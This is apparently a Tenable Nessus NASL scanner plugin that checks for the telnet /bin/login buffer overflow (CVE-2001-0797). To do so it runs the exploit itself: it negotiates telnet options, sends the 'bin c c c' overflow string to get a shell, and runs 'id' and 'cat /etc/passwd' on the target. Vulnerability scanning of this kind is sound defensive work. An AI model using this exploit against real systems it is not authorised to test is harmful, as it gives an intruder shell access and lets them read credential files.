#
# (C) Tenable Network Security
#  

desc = "
Synopsis :

It is possible to execute arbitrary commands on the remote host.

Description :

The remote implementation of the /bin/login utility, used when authenticating
a user via telnet or rsh contains an overflow which allows an attacker to 
gain a shell on this host, without even sending a shell code. 

An attacker may use this flaw to log in as any user (except root) on the 
remote host.

Solution :

http://www.cert.org/advisories/CA-2001-34.html

Risk factor :

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";



if (description) {
   script_id(11136);
   if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2001-a-0014");
   script_bugtraq_id(3681, 5848);
   script_cve_id("CVE-2001-0797");
   script_version("$Revision: 1.8 $");
  name["english"] = "/bin/login overflow exploitation";
  script_name(english:name["english"]);
 
  script_description(english:desc);
 
  summary["english"] = "Attempts to log into the remote host";
  script_summary(english:summary["english"]);
 
  # It might cause problem on some systems
  script_category(ACT_DESTRUCTIVE_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2002 - 2006 Tenable Network Security, Inc");

  family["english"] = "Gain a shell remotely";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes");
  script_require_ports("Services/telnet", 23);
  exit(0);
}




function init()
{
 send(socket:soc, data:raw_string(
 	0xFF, 252, 0x25,
	0xFF, 254, 0x26,
	0xFF, 252, 0x26,
	0xFF, 254, 0x03,
	0xFF, 252, 0x18,
	0xFF, 252, 0x1F,
	0xFF, 252, 0x20,
	0xFF, 252, 0x21,
	0xFF, 252, 0x22,
	0xFF, 0xFB, 0x27,
	0xFF, 254, 0x05,
	0xFF, 252, 0x23));
 r = recv(socket:soc, length:30);
 lim = strlen(r);
 for(i=0;i<lim - 2;i=i+3)
 {
  if(!(ord(r[i+2]) == 0x27))
  {
  if(ord(r[i+1]) == 251) c = 254;
  if(ord(r[i+1]) == 252) c = 254;
  if(ord(r[i+1]) == 253) c = 252;
  if(ord(r[i+1]) == 254) c = 252;
  
  s = raw_string(ord(r[i]), c, ord(r[i+2]));
  send(socket:soc, data:s);
  }
 }
 
 
 send(socket:soc, data:raw_string(0xFF, 0xFC, 0x24));
 
 
 r = recv(socket:soc, length:300);
 
 send(socket:soc, data:raw_string(0xFF, 0xFA, 0x27, 0x00, 0x03, 0x54, 0x54, 0x59, 0x50, 0x52, 0x4F, 0x4D, 0x50, 0x54, 0x01, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0xFF, 0xF0));
}

port = get_kb_item("Services/telnet");
if(!port)port = 23;

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);

if(soc)
{
  buf = init();
  send(socket:soc, data:string("bin c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c\r\n"));
  r = recv(socket:soc, length:4096);
  if(!r)exit(0);
  send(socket:soc, data:string("id\r\n"));
  r = recv(socket:soc, length:1024);
  if("uid=" >< r){
   send(socket:soc, data:string("cat /etc/passwd\r\n"));
   r = recv(socket:soc, length:4096);
   
   report = string(desc, "\n\nPlugin output :\n\n",
   "Here is the output of the command 'cat /etc/passwd' :\n", r);
   security_hole(port:port, data:report);
  }
}
